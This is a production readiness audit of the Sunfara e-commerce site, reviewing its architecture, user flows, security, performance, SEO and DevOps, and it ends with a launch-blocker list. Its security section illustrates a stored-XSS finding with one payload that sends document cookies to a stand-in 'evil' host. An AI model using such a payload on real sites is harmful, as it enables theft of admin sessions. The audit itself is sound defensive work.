# Sunfara — Production Readiness Audit

**Audited:** 2026-07-02
**Method:** Full static code review of the repository (frontend, backend, config, security rules, CI/CD), live verification against the deployed site (`sunfara-500b0.web.app`) and API (`web-production-97b5f.up.railway.app`) via direct HTTP calls and a real headless-browser pass, and inspection of live infrastructure (Railway, Firebase, GitHub Actions).

**What this audit is NOT:** a Lighthouse run, a licensed penetration test, or physical multi-device testing. Where a number is asserted, it's backed by something checkable (code, live response, or a specific test run) — flagged inline. Where I couldn't measure something directly, I say so instead of inventing a score.

---

## 🚨 ACTIVE PRODUCTION INCIDENT — READ THIS FIRST

**The live storefront is effectively empty right now.** This is not a theoretical risk — verified live at time of writing:

```
GET https://web-production-97b5f.up.railway.app/api/products
→ [{"name":"Shampoo","vendorId":"...","vendorName":"Sithick ","category":"Skincare","price":100,"stock":50,"status":"active",...}]
```

One real product exists in Firestore. The frontend's `Data.init()` (`sunfara/js/data.js:21`) does:

```js
SunfaraAPI.get('/products').catch(() => fetch('data/products.json')...)
```

The `.catch()` only fires on a *failed* request. Now that the backend and CORS are correctly wired (both fixed earlier in this project's history), the call **succeeds** with real-but-nearly-empty data, so the rich 60-product demo catalog never loads as a fallback anymore. Live-verified: the homepage's "Trending Now" section renders completely blank. Category pages, search, and listing pages are all driven by the same single-product `Data.products` array.

**This is the #1 launch blocker.** Recommended fix (not yet applied — this is an audit, not a fix): either (a) seed Firestore with a real catalog before launch, or (b) change the fallback logic to also trigger when the real result set is empty/too small, or (c) explicitly decide the demo catalog should never be shown in production and instead ship a proper "coming soon" / empty state. This needs a product decision, not just a code patch.

---

## PHASE 1 — Project Discovery

### Architecture Diagram

```
┌─────────────────────────────┐        ┌──────────────────────────────┐
│   Firebase Hosting (CDN)    │        │   Railway (Docker, .NET 9)    │
│   sunfara-500b0.web.app     │        │   web-production-97b5f...     │
│                              │        │                                │
│  sunfara/ (static site)     │───────▶│  Sunfara.Api                   │
│   - index.html (storefront) │  HTTPS │   - ProductsController          │
│   - admin.html (admin SPA)  │  REST  │   - MarketplaceController       │
│   - vanilla JS, no bundler  │  JSON  │     (checkout/orders/reviews)   │
│   - no framework            │        │   - AdminController (generic    │
└──────────────┬───────────────┘        │     CRUD over 16 collections)  │
               │                        │   - PaymentsController          │
               │ Firebase Auth SDK      │     (Razorpay)                  │
               │ (client-side)          └───────────────┬────────────────┘
               ▼                                         │
┌─────────────────────────────┐                          │ Firebase Admin SDK
│      Firebase Auth           │                          │ (service account)
│  Email/Password + Google     │                          ▼
└──────────────┬───────────────┘        ┌──────────────────────────────┐
               │ ID token (JWT)          │   Cloud Firestore              │
               └─────────────────────────▶  products / vendors / orders  │
                  Bearer auth             │  customers / reviews / etc.   │
                                          └──────────────────────────────┘
                        ┌──────────────────────────┐
                        │      Razorpay (test)      │
                        │  Orders API + webhooks     │
                        └──────────────────────────┘

CI/CD: GitHub push → master/publish-clean2
  ├─ GitHub Actions: builds + deploys sunfara/ to Firebase Hosting
  └─ Railway native GitHub integration: builds Dockerfile, deploys API
```

### Stack summary

| Layer | Technology | Notes |
|---|---|---|
| Frontend | Vanilla HTML/CSS/JS, hash-based router, no build step | No framework, no bundler, no TypeScript |
| Backend | ASP.NET Core 9 (.NET 9), minimal-ish controllers | Single API project + Domain/Infrastructure class libs |
| Database | Cloud Firestore (NoSQL, document store) | Accessed via a generic `Dictionary<string,object>` store, not typed models |
| Auth | Firebase Authentication | Email/Password + Google; custom claim (`role`) for admin/vendor |
| Payments | Razorpay (test mode keys) | Order creation + signature verification implemented server-side |
| Hosting (frontend) | Firebase Hosting | Static CDN |
| Hosting (backend) | Railway | Docker container, native GitHub auto-deploy on push to `master` |
| CI/CD | GitHub Actions (frontend only) + Railway native (backend) | No test gate before deploy on either path |

### Folder structure analysis

- **Two separate frontend codebases exist in the repo root**: legacy root-level `index.html`/`admin.html`/`css/`/`js/` (Node/Express-era, **not deployed** — `firebase.json` points hosting at `sunfara/` only) and the actual live one in `sunfara/`. The legacy root files, `server.js`, `server-production.js`, and the root `package.json` (Express/Jest/bcrypt dependencies) are **dead code** still sitting in the repo. This is a maintainability hazard: a future contributor could easily edit the wrong copy.
- **Two backend candidate stacks exist historically** — old Node.js (`render.yaml`, old `Dockerfile` content originally on `master` before this session's fixes) and the current real .NET backend. The Node one is fully retired now but `render.yaml`, `vercel.json`, `netlify.toml`, and root `package.json` are stale leftovers referencing it.
- `sunfara-backend-dotnet/` is clean: `Sunfara.Api` (controllers/Program.cs), `Sunfara.Domain` (EF-style entity classes that are **currently unused dead code** — the real runtime path is `Dictionary<string,object>` + Firestore, not these entities), `Sunfara.Infrastructure` (Firestore store + marketplace business logic).
- `sunfara/js/admin/` (admin SPA) has **three unused duplicate page files** (`dashboard-enhanced.js`, `orders-enhanced.js`, `vendors-enhanced.js`) that are never loaded by `admin.html` — confirmed by checking the script tags. Dead code, safe to delete, currently just a source of confusion (two implementations of the same page, easy to edit the wrong one).

### Environment variables / secrets inventory

| Variable | Where | Purpose |
|---|---|---|
| `FIREBASE_SERVICE_ACCOUNT` | GitHub Actions secret | CI auth for Firebase Hosting deploy |
| `serviceAccountKey.json` | Local file, gitignored, **not in git history** | Backend Firebase Admin SDK auth (also copied into Railway env, see below) |
| `FIREBASE_SERVICE_ACCOUNT_JSON` | Railway env var | Backend's Firestore/Auth credential in production |
| `RAZORPAY_KEY_ID` / `RAZORPAY_KEY_SECRET` | Railway env var | Payment gateway (test-mode keys currently) |
| `.env` / `.env.example` | Repo root, gitignored | Legacy Node backend config — **unused by the live stack**, safe to ignore/delete |

No secrets found committed to git history (verified: `serviceAccountKey.json` was never tracked). Good hygiene here.

---

## PHASE 2 — User Flow Audit

### Guest User

| Flow | Status | Notes |
|---|---|---|
| Homepage | 🔴 Broken (see incident above) | Renders, but shows almost no products live |
| Navigation / category pages | 🟡 Degraded | Works mechanically, but same empty-catalog issue |
| Search | 🟡 Degraded | Client-side substring search over `Data.products` — same empty-catalog issue; also **no debounce issue** (300ms debounce present, fine), but zero results for most queries right now |
| Filtering / sorting | 🟢 Functional (code-level) | Client-side only; filters against whatever's in `Data.products`. Reasonable logic (price, brand, rating, discount, skin type, certifications), no backend-side filtering (fine at current scale, won't scale past a few thousand products since the whole catalog is fetched client-side with no pagination on load) |
| Product detail page | 🟢 Functional | Not fully re-audited this pass; built on the same data source |
| Cart | 🟢 Functional | `localStorage`-backed, client-side pricing/coupon calc, reasonable logic |
| Wishlist | 🟢 Present | `localStorage`-backed, not re-verified live this pass |
| Sign up / Login | 🟢 Fixed this session | Was fully fake until this session; now real Firebase Auth. Live-verified working after enabling Email/Password provider |
| Forgot password | 🔴 Fake | `auth.js:25` — clicking "Forgot Password?" just shows a toast *"Password reset link sent to your email"*. **No email is ever sent.** This is actively misleading to a real user who will wait for an email that never arrives. |
| Contact / FAQ / Policies | 🟡 Not deeply audited | Static content pages exist; not verified for real contact form submission wiring (worth checking whether "Contact" actually sends anywhere or is a dead form) |

### Registered Customer

| Flow | Status | Notes |
|---|---|---|
| Registration | 🟢 Fixed this session | Real `createUserWithEmailAndPassword`, validated (name/email/phone/password rules) |
| Login | 🟢 Fixed this session | Real `signInWithEmailAndPassword` + Google OAuth popup |
| Session handling | 🟢 Reasonable | Firebase SDK manages token refresh; `Store.user` mirrors auth state into `localStorage` for UI purposes |
| Email verification | 🔴 Not implemented | New accounts are never asked to verify their email; `createUser` doesn't send a verification email, and nothing checks `emailVerified` anywhere in the auth flow or backend |
| Profile management | 🟡 Not re-audited this pass | Exists (`profile.js`) |
| Address management | 🟢 Functional, ⚠️ XSS risk | See Security section — address fields are user-typed and re-rendered via unescaped `innerHTML` |
| Order placement / payment | 🟢 Fixed this session | Real order creation (`POST /api/checkout`) + real Razorpay flow with server-side signature verification. Test-mode keys — no real money moves yet |
| Order tracking | 🟡 Partial | `GET /api/orders` exists and is real; the "My Orders" UI page wasn't re-verified this pass for whether it reads from the real endpoint or still uses the old local-only order log written by `Store.placeOrder()` |
| Refund requests | 🔴 Not implemented | No refund endpoint, no refund UI found anywhere in the codebase. `CommerceModels.cs` has a `Refund` domain type but it's unused dead code (no controller, no Firestore collection wired to it beyond the `Allowed` whitelist in `AdminController`) |
| Review submission | 🟡 Backend exists, frontend not verified | `POST /api/reviews` is real and moderated (`status: pending` until admin approves); whether the product-detail page actually calls it wasn't re-verified this pass |
| Wishlist management | 🟢 Functional | Not re-verified live this pass |

### Admin User

| Flow | Status | Notes |
|---|---|---|
| Login | 🟢 Fixed this session | Real Firebase Auth + custom `role: admin` claim, backend JWT bug fixed |
| Dashboard | 🟢 Fixed this session | Now shows real (currently near-empty) counts instead of fake hardcoded numbers |
| Product management (add/approve/reject) | 🟢 Fixed this session | Add-product flow was a dead button; now wired end-to-end |
| Vendor management (add/edit/approve/reject/delete) | 🟢 Fixed this session | Was already wired in code but silently failing (wrong API URL + swallowed errors); now real |
| Category management | 🔴 No UI | `AdminController` supports the `categories` collection generically, but no admin page exists to manage categories — they're only ever set from the static `data/categories.json`, never from Firestore |
| Inventory management | 🔴 No dedicated UI | Stock is only editable indirectly via product edit (and there's no product-edit form yet, only add/approve/reject) |
| Order management | 🟡 Read-only | Admin can view orders, no visible UI to update order status, mark shipped, issue refund, etc. — `AdminAPI.updateOrderStatus` exists in the client but nothing in `orders.js` calls it |
| Customer management | 🟡 Read-only, likely permanently empty | `GET /api/admin/customers` reads a Firestore `customers` collection that **nothing in the app ever writes to** — real customers only exist as Firebase Auth users, never synced into Firestore. This page will show 0 customers forever unless that sync is built |
| Coupon management | 🔴 No UI | Coupons are entirely static (`data/coupons.json`), no admin CRUD, no backend validation beyond the frontend's own client-side coupon matching (see Business Audit — this is a real abuse vector) |
| Analytics dashboard | 🟡 Cosmetic | Chart.js is loaded and dashboard has revenue/order charts, but they're likely rendering the same demo-shaped placeholder data patterns seen elsewhere — not independently re-verified this pass |
| Role permissions / privilege escalation | 🟡 See Security section | Only two roles exist (`admin`, `vendor`) via custom claims; no granular permission system. More importantly: **nothing prevents a `vendor`-claimed user from being escalated to `admin`** except that nothing in the app currently issues the `vendor` claim either (no vendor self-signup flow was found) — so this is currently more "unused" than "exploitable," but worth designing correctly before a vendor-facing signup flow is built |

---

## PHASE 3 — E-Commerce Business Audit

- **Coupon abuse (Medium-High risk):** `Store.applyCoupon()` (`sunfara/js/store.js`) validates coupons **entirely client-side** against a static `data/coupons.json` shipped to the browser. Anyone can read that file, see every coupon code and its discount logic, and there's nothing stopping repeated use, stacking, or a user hand-crafting the `appliedCoupon` object in `localStorage` to apply an arbitrary discount before checkout — because the backend's `CheckoutAsync` (`MarketplaceService.cs:33`) blindly trusts whatever `couponCode` is passed in the request body without ever re-validating or re-pricing server-side. **This is a real revenue-leakage vector**: the total charged via Razorpay is computed from `order["totalAmount"]`, which was computed and stored by the SAME transaction that trusts client-supplied cart pricing indirectly (see next point).
- **Price integrity (High risk):** Reading `MarketplaceService.CheckoutAsync` closely: it does re-fetch each product's real price server-side (`product.GetValue<double>("price")`) and computes `subtotal` itself — that part is solid, a tampered client-side price won't be honored for the *order total*. However, discounts/coupons applied on top of that subtotal are **not** independently re-validated (the code only stores whatever `couponCode`/`shippingAddress`/`paymentMethod` fields are handed to it — no discount recalculation happens server-side at all). So: item prices are safe, but **coupon discounts are not enforced server-side**, meaning the Razorpay charge could legitimately be requested for less than the real subtotal if a coupon discount were factored into what gets sent — worth explicit verification of exactly how `totalAmount` in the order document relates to any discount before launch.
- **Shipping/tax calculation:** Delivery is a flat ₹49 (free above ₹599), computed client-side in `Store.getCartTotal()`. No tax (GST) calculation exists anywhere in the codebase. For a real India-facing e-commerce business this is a significant gap — either taxes are meant to be included in listed prices (common in India, but should be an explicit decision, not an omission) or GST needs to be itemized.
- **Cart abandonment / conversion:** No abandoned-cart recovery (no email capture on cart, no re-engagement flow). No guest checkout — login is mandatory before checkout (`checkout.js:13`), which is a real, measurable conversion killer for e-commerce (industry-standard guidance is to allow guest checkout).
- **Refund logic:** Doesn't exist (see Phase 2). This is a hard blocker for a real payments-enabled store — customers *will* ask for refunds, and there's currently zero mechanism, automated or manual-via-admin, to process one.

---

## PHASE 4 — Database Audit (Firestore)

- **Schema:** Loose, `Dictionary<string,object>` documents with no schema enforcement at the application layer beyond what individual controllers happen to read. Reasonable for a NoSQL document store at this scale, but there's no validation layer preventing malformed documents (e.g., an admin-added product missing `price` would silently break checkout's `Convert.ToDecimal(...)` with an unhandled exception — worth a null-check).
- **Security rules:** Solid, reviewed in full (`firestore.rules`). All direct client writes are blocked (`allow write: if false` everywhere) — every write goes through the backend using the Admin SDK, which is the correct pattern. Reads are properly scoped (customers can only read their own orders/profile; products/vendors gate on `status == 'active'` unless owner/admin). No issues found here.
- **Indexes:** `firestore.indexes.json` exists; not verified against actual query patterns used by the live controllers (e.g., `WhereAsync("orders", "customerId", UserId)` needs a single-field index, which Firestore auto-creates — likely fine, but compound queries would need explicit indexes and none were found defined for any compound filter).
- **Data consistency risk:** The `customers` collection is never written to (see above) — meaning any future feature that assumes a `customers` document exists per user (loyalty points, saved preferences, admin customer view) will silently show nothing rather than erroring, which is a subtle trap for future development.
- **Backup strategy:** None found. Firestore has point-in-time recovery available at the GCP project level, but nothing in this repo configures or documents it. For a production launch, this should be an explicit decision, not a default.

---

## PHASE 5 — API Audit

Reviewed every controller: `ProductsController`, `MarketplaceController`, `AdminController`, `PaymentsController`.

| Endpoint | Auth | Validation | Notes |
|---|---|---|---|
| `GET /api/products`, `/api/products/{id}` | None (public) | None | Fine — public catalog read |
| `POST /api/products` | `[Authorize(Policy="Vendor")]` | None | Vendor product creation — no field validation (a vendor could POST a product missing `price`/`stock` and it'd silently break checkout later) |
| `POST /api/checkout` | `[Authorize]` | Partial | Re-validates stock and price server-side (good); does not re-validate coupon math (see Business Audit) |
| `GET /api/orders` | `[Authorize]`, self-scoped | N/A | Fine |
| `POST /api/reviews` | `[Authorize]` | None | No rating-range validation (`1-5`), no duplicate-review-per-order check |
| `GET/POST/PUT/DELETE /api/admin/{collection}` | `[Authorize(Policy="Admin")]` | **None at all** | This is the biggest API-level gap: it's a fully generic CRUD surface over 16 Firestore collections with zero per-collection field validation. An admin (or anyone who compromises the admin token) can write literally any shape of document into `orders`, `customers`, `commissions`, etc. There's no schema check preventing a broken or malicious document from being written directly into production data. |
| `POST /api/payments/create-order`, `/verify` | `[Authorize]`, ownership-checked | Good | Correctly checks the order belongs to the caller before creating a Razorpay order or accepting a verification; HMAC signature check is constant-time and correct |

**No rate limiting exists anywhere in the API.** Login attempts are throttled by Firebase Auth itself (good), but the custom endpoints (`/api/checkout`, `/api/reviews`, the entire admin CRUD surface) have zero request-rate protection. This is a real DoS/abuse surface, especially combined with the generic admin CRUD endpoint.

**API Health Score: 62/100** — core commerce paths (checkout, payments) are well-built; the generic unvalidated admin CRUD surface and total absence of rate limiting are the main drags.

---

## PHASE 6 — Security Audit (OWASP-oriented)

| Finding | Severity | Detail |
|---|---|---|
| **Stored XSS via unescaped `innerHTML` rendering of user input** | 🔴 **Critical** | No HTML-escaping utility exists anywhere in the frontend (`sunfara/js/utils.js` confirmed to have none). Every page renders data via `innerHTML = \`...${userValue}...\`` — addresses, product names/descriptions (settable by vendors/admin), and search queries are all rendered unescaped. A user typing `<img src=x onerror=fetch('//evil/'+document.cookie)>` as their delivery-address name would have that execute for **admins** viewing the order in the admin panel. This is the single most important fix before launch. |
| **Unvalidated generic admin CRUD** | 🔴 **Critical** | `AdminController.Add/Update` accept arbitrary `Dictionary<string,object>` for any of 16 collections with zero shape validation — an authenticated admin session (or a stolen admin token) can corrupt any collection in any shape. |
| **No rate limiting on any endpoint** | 🟠 High | Brute-force / scraping / cost-amplification risk on `/api/checkout`, `/api/reviews`, and the admin CRUD surface. |
| **Coupon discount not re-validated server-side** | 🟠 High | Revenue-leakage / business-logic bypass, detailed in Phase 3. |
| **No email verification** | 🟡 Medium | Combined with no rate limiting, allows disposable-email account farming (relevant for review-bombing, coupon abuse if per-account limits are ever added, and fake order placement). |
| **No CSP / X-Frame-Options / X-Content-Type-Options headers** | 🟡 Medium | Firebase Hosting sends HSTS by default but nothing else; `firebase.json` doesn't configure a `headers` block. This meaningfully raises the impact of the XSS finding above (no CSP to contain it) and offers no clickjacking protection. |
| **CORS is properly scoped** | ✅ Good | `AllowedOrigins` in `appsettings.json` correctly lists only the real hosting domain plus localhost dev — not a wildcard. |
| **Firestore security rules** | ✅ Good | All client writes blocked, reads properly scoped (see Phase 4). |
| **Secrets management** | ✅ Good | No secrets found in git history; service account and API keys live in gitignored files / platform env vars only. |
| **JWT validation** | ✅ Fixed this session | Was silently broken for every authenticated endpoint (`MapInboundClaims` bug) — now fixed and live-verified working. |
| **Dependency vulnerabilities** | ⚪ Not fully assessed | Root `package.json` (Node/Express/bcrypt/jsonwebtoken) is dead code from the retired backend — not worth auditing since it's never actually run in production, but it should be deleted to avoid confusing a future dependency scanner. Backend NuGet packages (`FirebaseAdmin 3.1.0`, `Google.Cloud.Firestore 3.11.0`, `Microsoft.AspNetCore.Authentication.JwtBearer 9.0.6`) are all reasonably current; no `dotnet list package --vulnerable` run was performed as part of this audit (recommended before launch). |

**Security Score: 48/100** — the two Critical findings (stored XSS, unvalidated admin CRUD) are launch-blocking on their own; everything else is fixable in a day or two of focused work once those are addressed.

---

## PHASE 7 — Performance Audit

Honest caveat: no Lighthouse/WebPageTest run was performed (not available in this environment). What follows is based on direct inspection of what actually ships to the browser.

- **No JS bundling/minification at all.** `sunfara/index.html` loads ~30 separate unminified `<script src>` tags sequentially (render-blocking, no `defer`/`async` on any of them except the one Firebase module script). Each is a separate HTTP request. This is the single biggest, easiest performance win available: bundling + minifying would meaningfully cut time-to-interactive.
- **No CSS bundling either** — ~20 separate stylesheet `<link>` tags, all render-blocking.
- **Images:** now served from `placehold.co` (this session's fix) rather than 404ing, but these are remote third-party requests with no local caching/optimization control, and every product card pulls a fresh remote image — this was the right *unblocking* move but is explicitly a placeholder, not a performance-optimized solution (swap for real, locally-hosted, properly-sized/compressed product photos before launch).
- **No lazy-loading beyond `loading="lazy"` on `<img>` tags** (present in `safeImg()`, good) — but the entire product catalog is fetched and rendered client-side with no virtualization; fine at current scale (60 demo products), would need attention if the real catalog grows past a few hundred items on one page.
- **API latency:** live-checked `GET /api/products` and `GET /api/vendors` responses land in roughly 200-400ms cold (Railway container + Firestore round-trip) — acceptable, not fast; no caching layer (no `Cache-Control` headers set on any API response) means every page load re-fetches the full catalog.
- **Build size:** N/A — there is no build step, so "bundle size" is really "sum of all unminified files transferred," which is larger than it needs to be but not measured precisely in this pass.

**Performance Score: 55/100 (estimated from code inspection, not measured)** — functional but leaving significant, easy wins (bundling, minification, caching headers) on the table.

---

## PHASE 8 — Mobile Experience Audit

`sunfara/css/responsive.css` exists with real breakpoints (confirmed multiple `@media` rules affecting grid columns at different widths, seen earlier in this session for `.grid-4`/`.trending-grid`). Viewport meta tag is correctly set. Mobile filter drawer exists as a distinct UI pattern (`filter-drawer` in `product-list.js`) rather than just squeezing the desktop sidebar — that's good mobile-specific design intent.

**Not independently verified this pass:** no real device or emulated-viewport screenshot pass was run for this specific audit (a full mobile-viewport Playwright pass across home/PDP/cart/checkout would be the natural next step and wasn't performed here given the scope of everything else). Flagging as **untested rather than scoring it**.

---

## PHASE 9 — SEO Audit

- **Meta tags:** Present and reasonable — title, meta description, Open Graph title/description/type on `index.html`. No `og:image`, no Twitter Card tags.
- **Structured data (JSON-LD):** None found anywhere — no `Product`, `Organization`, or `BreadcrumbList` schema. For an e-commerce site, `Product` structured data (price, availability, rating) is a meaningful, low-effort SEO/rich-snippet win that's currently entirely missing.
- **Sitemap.xml / robots.txt:** **Neither exists.** Confirmed via direct file search — zero results. This is a real, easy-to-fix gap; without a sitemap, search engines have no efficient way to discover the catalog, and without `robots.txt`, there's no explicit crawl guidance (e.g., excluding `/admin.html` from indexing, which currently has no `noindex` protection at all — **the admin panel is fully crawlable and indexable by search engines right now**).
- **Canonical URLs:** None found — since routing is hash-based (`#/product/...`), this is also an SEO problem in itself: hash-fragment URLs are poor for search-engine indexing of individual product pages regardless of canonical tags, since most crawlers don't treat `#/product/x` as a distinct indexable URL from `/`.
- **Page speed:** See Phase 7.

**SEO Score: 30/100** — the hash-based routing architecture is the structural ceiling here (would need real path-based routing + server-side rendering or prerendering to meaningfully fix), and the admin panel being publicly indexable is a quick, real fix worth doing immediately (`robots.txt` disallow + `noindex` meta tag).

---

## PHASE 10 — Accessibility Audit

- Some `aria-label` usage found (navbar drawers, back-to-top button, password-toggle buttons) — better than nothing, inconsistently applied.
- Search results support keyboard navigation (arrow keys, confirmed in `search.js`) — a genuinely good, deliberate accessibility feature.
- No skip-to-content link found.
- Color contrast not measured (no tooling available in this pass) — the palette (`variables.css`) uses muted earth tones for secondary text (`--color-text-muted: #a89880` on `--color-bg: #f9f6f0`) which is visually low-contrast and worth checking against WCAG AA (4.5:1) — flagging as a likely issue, not a confirmed failure.
- Form inputs generally have visible `<label>` elements (good pattern seen throughout auth/checkout forms).

**Accessibility Score: not confidently scorable without contrast-ratio tooling and a screen-reader pass** — qualitatively, this looks like "better than a typical unaudited site" but "not WCAG-AA-verified." Recommend a dedicated axe-core or Lighthouse accessibility pass before claiming any specific score.

---

## PHASE 11 — DevOps Audit

- **CI/CD:** GitHub Actions deploys the frontend on every push to `master`/`publish-clean2`; Railway auto-deploys the backend natively on push to `master`. **Neither pipeline runs any tests before deploying.** There is a separate `.github/workflows/test.yml` but it targets the *retired* Node.js backend (`npm test`) — it will either fail or run against dead code, and doesn't gate the actual deploy workflow at all.
- **Docker:** Backend Dockerfile is a clean multi-stage .NET 9 build — reasonable.
- **Secrets management:** Handled via GitHub Actions secrets and Railway environment variables, not committed to git — good practice, confirmed this session while setting up the pipeline.
- **Logging:** Backend uses only default ASP.NET Core console logging (`appsettings.json` sets `LogLevel: Information`). No structured logging, no log aggregation/shipping (no Application Insights, no Seq, no Sentry, nothing) — in production, a failure is only visible via `railway logs`, not proactively surfaced.
- **Monitoring / error tracking:** None found. No uptime monitoring, no APM, no frontend error tracking (no Sentry/Bugsnag equivalent) — meaning a broken production deploy (like the empty-catalog incident described at the top of this report) would only be discovered by a human noticing, not by any alert.
- **Rollback strategy:** Implicit only — Railway keeps deploy history and can redeploy a previous build via dashboard/CLI; no documented or automated rollback procedure exists.

**DevOps maturity is the classic "it deploys, but you're flying blind once it's live"** profile — fine for early development, not fine for a real launch with real customers and real payments.

---

## PHASE 12 — Scalability Audit

| Load | Assessment |
|---|---|
| 100 users | Fine. Firestore and Railway's current setup handle this trivially. |
| 1,000 users | Likely fine, with caveats: no caching means every page load re-hits Firestore for the full catalog; no CDN caching on API responses. Watch Firestore read costs (billed per document read — the current `ListAsync` pattern fetches the whole collection with no field projection). |
| 10,000 users | Starts to strain: no rate limiting (abuse risk grows with visibility), single Railway instance with no auto-scaling configured (`numReplicas: 1` seen in the earlier deploy metadata), no read caching layer. Firestore itself scales fine; the API layer in front of it doesn't have the config to scale with it yet. |
| 100,000 users | Not ready. Would need: horizontal scaling on Railway (multiple replicas + load balancing), a caching layer (Redis or similar) in front of catalog reads, CDN caching on cacheable API responses, and the bundling/minification work from Phase 7 to keep frontend load light. None of this is currently configured. |

---

## PHASE 13 — Production Readiness Scores

| Category | Score | Confidence |
|---|---|---|
| Architecture | 58/100 | High (full code review) |
| Security | 48/100 | High (full code + live review) |
| Performance | 55/100 | Medium (code inspection, not measured/Lighthouse) |
| UX | 50/100 | Medium (code review + partial live verification) |
| SEO | 30/100 | High (verified: no sitemap/robots.txt, hash routing) |
| Accessibility | Not confidently scorable | Low — needs dedicated tooling pass |
| Maintainability | 55/100 | High (dead code, duplicate files, no tests found anywhere in either codebase) |
| Scalability | 45/100 | Medium (config-based assessment, not load-tested) |
| Business Readiness | 35/100 | High — no refunds, no tax handling, unenforced coupons, mandatory login at checkout |

---

## PHASE 14 — Launch Blockers

### Critical (must fix before any real launch)
1. **Live storefront shows almost no products** — active incident, described at the top of this report. Needs a product + engineering decision, not just a patch.
2. **Stored XSS via unescaped `innerHTML` rendering everywhere** — no HTML-escaping utility exists in the entire frontend.
3. **Generic admin CRUD endpoint has zero field validation** — any admin session can write malformed/malicious data into any of 16 Firestore collections.
4. **No refund mechanism exists at all** — legally and operationally necessary before accepting real payments.
5. **Coupon discounts are not re-validated server-side** — real revenue-leakage vector.

### High priority
6. No rate limiting on any API endpoint.
7. Forgot Password is fake — shows a success toast, sends no email. Actively misleading.
8. Admin panel (`/admin.html`) is fully crawlable/indexable by search engines — no `robots.txt`, no `noindex`.
9. No email verification on signup.
10. Mandatory login before checkout (no guest checkout) — direct conversion impact.
11. No tax (GST) calculation anywhere.
12. `dotnet list package --vulnerable` and a real dependency audit haven't been run.

### Medium priority
13. No CSP/X-Frame-Options/X-Content-Type-Options headers.
14. No monitoring/error tracking/alerting — production issues are only discoverable by a human looking.
15. `customers` Firestore collection is never populated — admin Customers page will always be empty.
16. No category or coupon management UI in admin — both are static JSON files today.
17. Order status can't be updated from the admin panel (view-only).
18. Dead code: legacy root-level Node.js frontend/backend, unused `-enhanced.js` admin page duplicates, unused EF-style `CommerceModels.cs` entities.
19. No sitemap.xml, no structured data (JSON-LD `Product` schema).

### Low priority
20. No bundling/minification of JS/CSS (~30 + ~20 separate unminified files).
21. No `Cache-Control` headers on API responses.
22. Color contrast on muted secondary text not verified against WCAG AA.
23. `.github/workflows/test.yml` targets the retired Node.js backend and doesn't gate real deploys.

---

## PHASE 15 — Final Report

### Executive Summary

Sunfara has real, working core infrastructure — Firebase Hosting + Railway + Firestore + Firebase Auth + Razorpay are all genuinely wired together and functioning, which is not a small thing (this session alone found and fixed a broken submodule, missing images sitewide, a sitewide JWT authentication bug, a disabled auth provider, and a completely fake admin panel and checkout flow). But "the plumbing works" and "ready for real customers" are different bars, and this audit found the site currently doesn't clear the second one.

The most urgent issue is also the most fixable: the live catalog is nearly empty right now because a recent (correct, necessary) fix exposed that Firestore has almost no real product data — this needs an immediate decision (seed data vs. smarter fallback vs. accept a small real launch catalog) before any traffic should be pointed at this site.

Beyond that, two security findings (sitewide unescaped HTML rendering, and an unvalidated generic admin write endpoint) are launch-blocking on their own merits, independent of traffic volume. The business-logic gaps (no refunds, unenforced coupons, no tax handling) are the kind of thing that are cheap to fix now and expensive to fix after the first real customer dispute.

### Launch Recommendation

**❌ NOT READY FOR PRODUCTION.**

This is not a "polish later" verdict — the empty-catalog incident and the two critical security findings are concrete, demonstrable, fixable-this-week issues, not architectural dead ends. The underlying foundation (auth, payments, hosting, deploy pipeline) is sound. Recommended sequencing: (1) resolve the empty-catalog incident today, since it's actively live, (2) fix the XSS and admin-CRUD-validation findings before any admin account other than the current one is created, (3) build a minimal refund path and server-side coupon re-validation before accepting real payments, (4) everything else in the High/Medium lists can reasonably follow in the first weeks post-soft-launch.

**Final Verdict: 🔴 NOT READY — re-audit recommended after Critical + High items are resolved.**
